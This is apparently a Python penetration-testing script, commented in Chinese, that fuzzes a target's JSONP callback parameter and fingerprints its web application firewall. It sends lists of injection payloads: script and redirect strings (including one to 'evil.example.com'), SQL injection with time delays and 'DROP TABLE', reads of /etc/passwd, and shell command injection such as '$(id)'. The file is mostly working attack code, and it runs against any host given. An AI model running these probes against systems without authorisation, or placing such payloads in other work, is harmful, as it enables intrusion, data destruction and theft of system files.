# -*- coding: utf-8 -*-
"""JSONP callback 注入探测 + WAF 指纹（空响应触发规则）

usage: python jsonp_fuzz.py <host> <path> [--param callback] [--out out/jsonp_waf.json]

<path> 可以带已有 query，例如 /api/hot?bid=1；脚本会追加 <param>=<payload>。
"""
import sys, json, os, urllib.parse, time
sys.stdout.reconfigure(encoding="utf-8", errors="ignore")
from concurrent.futures import ThreadPoolExecutor
from probe import raw

argv = sys.argv[1:]
PARAM = "callback"
OUT = "out/jsonp_waf.json"
if "--param" in argv:
    i = argv.index("--param")
    PARAM = argv[i + 1]
    del argv[i:i + 2]
if "--out" in argv:
    i = argv.index("--out")
    OUT = argv[i + 1]
    del argv[i:i + 2]
if len(argv) < 2:
    print(__doc__.strip())
    sys.exit(2)
HOST = argv[0]
BASE = argv[1]
if os.path.dirname(OUT):
    os.makedirs(os.path.dirname(OUT), exist_ok=True)

CB = [
    "1", "abc", "alert", "alert(1)", "alert(1);//", "alert(1)/*", "x;alert(1);//",
    "a=1;alert(1);//", "alert&x", "alert'1", 'alert"1', "alert`1",
    "<script>alert(1)</script>", "img src=x onerror=alert(1)",
    "a<b", "a>b", "a&b", "a|b", "a/b", "a\\b", "a%0ab", "a%0db",
    "a b", "a\tb", "中文", "A" * 200,
    "window.location='http://evil.example.com'",
    "eval", "Function", "constructor",
    "%00", "..%2f..%2f", "{{7*7}}", "${7*7}",
]

WAF = [
    "1", "1' OR '1'='1", "1 UNION SELECT 1,2,3--", "1 AND SLEEP(5)--",
    "1' OR 1=1#", "1; DROP TABLE x--", "<script>alert(1)</script>",
    "../../../../etc/passwd", "cat /etc/passwd", "|id", ";id", "$(id)",
    "1 AND 1=1", "1 AND 1=2", "1' AND SLEEP(5)#", "admin'--",
    "1 OR 1=1", "UNION ALL SELECT NULL", "1 AND BENCHMARK(10000000,MD5(1))",
    "<svg onload=alert(1)>", "\"><script>alert(1)</script>",
    "%3Cscript%3E", "1 AND EXTRACTVALUE(1,CONCAT(0x7e,USER()))",
]


def _sep(base):
    return "&" if "?" in base else "?"


def job_cb(v):
    q = BASE + _sep(BASE) + PARAM + "=" + urllib.parse.quote(v, safe="")
    st, h, b = raw(HOST, q, timeout=15)
    body = b.decode("utf-8", "ignore")
    ct = h.get("content-type", "")
    # 看回调值是否原样出现在响应前缀
    prefix = body[:60]
    return {"cb": v[:40], "st": st, "len": len(b), "ct": ct, "prefix": prefix.replace("\n", " ")}


def job_waf(v):
    q = BASE + _sep(BASE) + urllib.parse.urlencode({"bid": v})
    t0 = time.time()
    st, h, b = raw(HOST, q, timeout=25)
    dt = time.time() - t0
    flag = []
    if len(b) == 0:
        flag.append("EMPTY-RESPONSE")
    if dt > 4.5:
        flag.append("DELAY-%.1fs" % dt)
    return {"v": v[:45], "st": st, "len": len(b), "t": round(dt, 2), "flag": flag,
            "body": b.decode("utf-8", "ignore")[:120].replace("\n", " ")}


if __name__ == "__main__":
    print("[*] JSONP callback 注入")
    with ThreadPoolExecutor(max_workers=8) as ex:
        r = list(ex.map(job_cb, CB))
    for x in r:
        print("%3d %6d %-42s | %s" % (x["st"], x["len"], x["cb"], x["prefix"][:70]))

    print("\n[*] WAF / 注入指纹")
    with ThreadPoolExecutor(max_workers=6) as ex:
        r2 = list(ex.map(job_waf, WAF))
    for x in r2:
        print("%3d %6d %5.1fs %-42s | %s | %s" % (
            x["st"], x["len"], x["t"], x["v"], ",".join(x["flag"]) or "-", x["body"][:60]))

    json.dump({"cb": r, "waf": r2}, open(OUT, "w", encoding="utf-8"),
              ensure_ascii=False, indent=2)
    print("\n[+] saved %s" % OUT)
